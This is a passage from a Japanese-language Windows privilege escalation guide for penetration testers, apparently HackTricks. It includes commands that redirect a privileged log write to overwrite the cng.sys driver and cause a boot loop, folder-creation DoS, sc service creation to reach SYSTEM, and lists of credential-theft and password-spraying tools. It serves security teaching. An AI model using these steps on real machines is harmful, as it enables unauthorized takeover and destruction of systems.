> これはフォルダーのメタデータを格納する NTFS の内部ストリームを対象としており、これを削除するとフォルダーが削除されます。

5. ステップ 5: oplock を解放する
- SYSTEM プロセスが処理を続け、`file1.txt` を削除しようとします。
- しかし、junction + symlink により、実際には次を削除しています。
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` が SYSTEM によって削除される。

### 任意のフォルダー作成から恒久的な DoS へ

**任意のフォルダーを SYSTEM/admin として作成できる**プリミティブを悪用します。**ファイルを書き込めない**場合や、**弱いアクセス許可を設定できない**場合でも可能です。

次のように、**重要な Windows ドライバー**の名前を付けた**フォルダー**（ファイルではなく）を作成します。
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` カーネルモードドライバーに対応します。
- **事前にフォルダーとして作成しておくと**、Windows は起動時に実際のドライバーを読み込めなくなります。
- その後、Windows は起動時に `cng.sys` の読み込みを試みます。
- フォルダーを検出すると、**実際のドライバーを解決できず**、**クラッシュするか、起動が停止します**。
- **フォールバックはなく**、外部から対処しない限り（例：ブート修復、ディスクへのアクセス）、**復旧できません**。

### 特権ログ／バックアップパスと OM symlinks から任意ファイルの上書き／起動 DoS へ

**特権サービス**が**書き込み可能な設定ファイル**から読み取ったパスにログ／エクスポートを書き込む場合、**Object Manager symlinks + NTFS mount points** でそのパスをリダイレクトすると、特権による書き込みを任意ファイルの上書きに利用できます（SeCreateSymbolicLinkPrivilege がなくても可能）。<sup>[[15]](#references)</sup>

**要件**
- 書き込み先パスを保存する設定ファイルが攻撃者にとって書き込み可能であること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作があること（ログ、エクスポート、レポート）。

**攻撃チェーンの例**
1. 設定ファイルを読み取り、特権ログの出力先を特定します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` にある `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 管理者権限なしでパスをリダイレクトします。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待ちます（例: 管理者が「テスト SMS を送信」を実行）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされたファイルを調べ（hex/PE parser）、破損を確認します。再起動すると、Windows は改ざんされたドライバーのパスから読み込もうとするため、**boot loop DoS** が発生します。この手法は、特権サービスが書き込み用に開く保護対象ファイル全般に応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合、そちらが先に試される可能性があり、破損データの信頼性の高い DoS sink として利用できます。



## **高整合性から System へ**

### **新しいサービス**

すでに High Integrity プロセスで実行している場合、**SYSTEM への道**は、新しいサービスを**作成して実行するだけ**で簡単に開けることがあります。

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する際は、有効なserviceであること、またはbinaryが必要な処理をすばやく実行することを確認してください。有効なserviceでない場合、20秒後に終了させられます。

### AlwaysInstallElevated

High Integrityプロセスから、**AlwaysInstallElevatedのレジストリエントリを有効化**し、_**.msi**_ wrapperを使ってreverse shellを**インストール**できます。\
[関連するレジストリキーと_.msi_パッケージのインストール方法については、こちらを参照してください。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは**[**こちら**](seimpersonate-from-high-to-system.md)**で確認できます。**

### From SeDebug + SeImpersonate to Full Token privileges

これらのtoken privilegeがあれば（おそらく、すでにHigh Integrityで動作しているプロセス内で確認できます）、SeDebug privilegeを使って（保護されたプロセスを除く）**ほぼすべてのプロセスを開き**、そのプロセスの**tokenをコピー**して、そのtokenで**任意のプロセスを作成**できます。\
この手法では通常、**すべてのtoken privilegeを持つSYSTEM実行中のプロセスを選びます**（_はい、すべてのtoken privilegeを持たないSYSTEMプロセスもあります_）。\
**この手法を実行するコード例は**[**こちら**](sedebug-+-seimpersonate-copy-token.md)**で確認できます。**

### **Named Pipes**

この手法は、meterpreterが`getsystem`で権限昇格するために使用します。手法の概要は、**pipeを作成し、そのpipeに書き込むserviceを作成または悪用する**ことです。その後、**`SeImpersonate`** privilegeを使ってpipeを作成した**server**は、pipe client（service）のtokenを**偽装**し、SYSTEM privilegeを取得できます。\
[name pipeについて詳しく知りたい場合は、こちらをお読みください。](#named-pipe-client-impersonation)\
[name pipeを使ってhigh integrityからSystemに移行する例はこちらをお読みください。](from-high-integrity-to-system-with-name-pipes.md)

### Dll Hijacking

**SYSTEMとして実行中のプロセスにロードされるdllを**うまく**hijack**できれば、その権限で任意のコードを実行できます。そのため、Dll Hijackingもこの種の権限昇格に有効です。さらに、dllのロードに使われるフォルダへの**write permission**があるため、**High Integrityプロセスからの方がはるかに簡単に実行できます**。\
**Dll hijackingについて詳しくは**[**こちら**](dll-hijacking/index.html)**をご覧ください。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## さらに役立つ情報

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windowsのローカル権限昇格ベクターを調べる最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurationや機密ファイルをチェックします（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- misconfigurationの可能性をチェックし、情報を収集します（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurationをチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存済みセッション情報を抽出します。ローカルで-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerからcredentialsを抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したpasswordをdomain全体にsprayします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell製のADIDNS/LLMNR/mDNS spoofingおよびman-in-the-middleツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windowsの基本的なprivesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc vulnerabilityを検索します（Watsonにより非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（Admin権限が必要）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc vulnerabilityを検索します（VisualStudioを使ってコンパイルする必要があります）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurationを探してホストをenumerateします（privescというより情報収集ツールです）（コンパイルが必要です） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のソフトウェアからcredentialsを抽出します（githubにprecompiled exeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfigurationをチェックします（githubにprecompiled executableがあります）。非推奨です。Win10では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- misconfigurationの可能性をチェックします（python製exe）。非推奨です。Win10では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿をもとに作成されたツールです（正常に動作させるためにaccesschkは不要ですが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルのpython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルのPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

.NETの正しいバージョンを使ってプロジェクトをコンパイルする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている.NETのバージョンを確認するには、次のようにします:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Privilege Escalationの基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [弱いフォルダー権限を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux ローカル権限昇格ワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: ATは新たな定番 (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - OSCP完全ガイド](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalationガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalationチェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [ペンテスター向けWindows Privilege Escalation手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBAマクロフィッシング → hMailServerの認証情報を復号 → Veeam CVE-2023-27532でSYSTEM権限を取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)とカーネルトークン窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: カーネルの影で繰り広げられるいたちごっこ](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADAシステムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlinkの使い方](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: Windowsでのシンボリックリンクの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.jsの信頼が招く落とし穴: Windowsでの危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.jsモジュール: `node_modules`フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++チェックリストの課題と解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - サービスバイナリのハイジャック](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [MicroslopでのPwn2Own: CLDFLTとDirectXカーネルの競合状態を連鎖させたWindows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配する1つのI/O Ring: Windows 11における完全な読み書きExploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意ファイル削除を悪用して権限昇格する方法とその他の優れたテクニック](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPsのExploitコード](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS攻撃 パート2: CVE-2020-1013、Windows 10のLocal Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultを探る](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - イメージの変更が権限昇格につながる場合のKerberos Resource Based Constrained Delegation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10のSSH AgentからSSH秘密鍵を抽出する](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – エンタープライズのアップデートサーバーをバックドア工場に変える (0_o) – パート1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – エンタープライズのアップデートサーバーをバックドア工場に変える (0_o) – パート2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installerフォルダー削除による権限昇格](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: NT AUTHORITY\SYSTEMへの足取りをたどる](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
